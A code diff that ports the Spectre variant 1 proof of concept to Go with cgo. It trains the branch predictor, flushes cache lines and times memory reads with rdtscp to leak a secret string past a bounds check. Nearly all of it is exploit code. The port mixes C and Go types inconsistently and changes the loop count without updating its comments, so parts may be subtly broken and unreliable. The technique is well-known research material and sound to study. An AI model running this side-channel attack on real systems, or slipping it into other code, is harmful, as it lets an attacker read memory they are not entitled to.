@@ -25,13 +25,11 @@ var array1 = [160]uint8{ 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16}
 var unused2 = [64]uint8{}
 var array2 = [256 * 512]uint8{}
 
-var Results = [256]int{}
-
 var secret = []byte("The Magic Words are Squeamish Ossifrage.")
 
 var temp uint8 = 0 /* Used so compiler won’t optimize out victim_function() */
 
-func victim_function(x C.size_t) {
+func victim_function(x uint) {
 	if x < array1_size {
 		temp &= array2[array1[x] * 512]
 	}
@@ -44,17 +42,14 @@ const CACHE_HIT_THRESHOLD = 80 /* assume cache hit if time <= threshold */
 
 /* Report best guess in value[0] and runner-up in value[1] */
 func readMemoryByte(malicious_x C.size_t, value[2] uint8, score[2] int) {
-	var tries, j, k, mix_i int
-	var junk uint8
-	var training_x, x C.size_t
-	var time1, time2 uint64 //register
+	results := [256]int{}
+	var j, k, mix_i int
+	var junk uint8 = 0
+	var training_x, x uint
+	var time1, time2 C.ulonglong //register
 	var addr *uint8
 
-	for i := 0; i < 256; i++ {
-		Results[i] = 0
-	}
-
-	for tries = 999; tries > 0; tries-- {
+	for tries := 999; tries > 0; tries-- {
 
 		/* Flush array2[256*(0..255)] from cache */
 		for i := 0; i < 256; i++ {
@@ -62,16 +57,18 @@ func readMemoryByte(malicious_x C.size_t, value[2] uint8, score[2] int) {
 		}
 
 	/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
-	training_x = tries % int(array1_size);
-	for j := 29; j >= 0; j-- {
+	training_x = uint(tries) % array1_size
+	for j := 29; j > 0; j-- {
 		C._mm_clflush( & array1_size);
 
-		for z := 0; z < 100; z++ {} /* Delay (can also mfence) */
+		for z := 0; z < 100; z++ {
+			/* Delay (can also mfence) */
+		}
 
 		/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
 		/* Avoid jumps in case those tip off the branch predictor */
-		x = ((j % 6) - 1) & 0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
-		x = (x | (x >> 16)) /* Set x=-1 if j&6=0, else x=0 */
+		x = uint(((j % 6) - 1) & (0xFFFF ^ 0)) /* Set x=FFF.FF0000 if j%6==0, else x=0 */
+		x = uint((x | (x >> 16))) /* Set x=-1 if j&6=0, else x=0 */
 		x = training_x ^ (x & (malicious_x ^ training_x))
 
 		/* Call the victim! */
@@ -82,12 +79,12 @@ func readMemoryByte(malicious_x C.size_t, value[2] uint8, score[2] int) {
 	/* Tme reads. Order is lightly mixed up to prevent stride prediction */
 	for i := 0; i < 256; i++ {
 		mix_i = ((i * 167) + 13) & 255
-		addr = & array2[mix_i * 512]
+		addr = &array2[mix_i * 512]
 		time1 = C.__rdtscp(&junk) /* READ TIMER */
 		junk = *addr             /* MEMORY ACCESS TO TIME */
 		time2 = C.__rdtscp(&junk) - time1 /* READ TIMER & COMPUTE ELAPSED TIME */
 		if time2 <= CACHE_HIT_THRESHOLD && mix_i != int(array1[tries % int(array1_size)]) {
-			Results[mix_i]++ /* cache hit - add +1 to score for this value */
+			results[mix_i]++ /* cache hit - add +1 to score for this value */
 		}
 	}
 
@@ -95,23 +92,23 @@ func readMemoryByte(malicious_x C.size_t, value[2] uint8, score[2] int) {
 	j = 0
 	k = 0
 	for i := 0; i < 256; i++ {
-		if j < 0 || Results[i] >= Results[j] {
+		if j < 0 || results[i] >= results[j] {
 			k = j
 			j = i
-		} else if k < 0 || Results[i] >= Results[k] {
+		} else if k < 0 || results[i] >= results[k] {
 			k = i
 		}
 	}
-		if (Results[j] >= (2 * Results[k] + 5) || (Results[j] == 2 && Results[k] == 0)) {
+		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0)) {
 			break /* Clear success if best is > 2*runner-up + 5 or 2/0) */
 		}
 
 	}
-	Results[0] ^= int(junk) /* use junk so code above won’t get optimized out*/
+	results[0] ^= int(junk) /* use junk so code above won’t get optimized out*/
 	value[0] = uint8(j)
-	score[0] = Results[j]
+	score[0] = results[j]
 	value[1] = uint8(k)
-	score[1] = Results[k]
+	score[1] = results[k]
 }
 
 func main() {
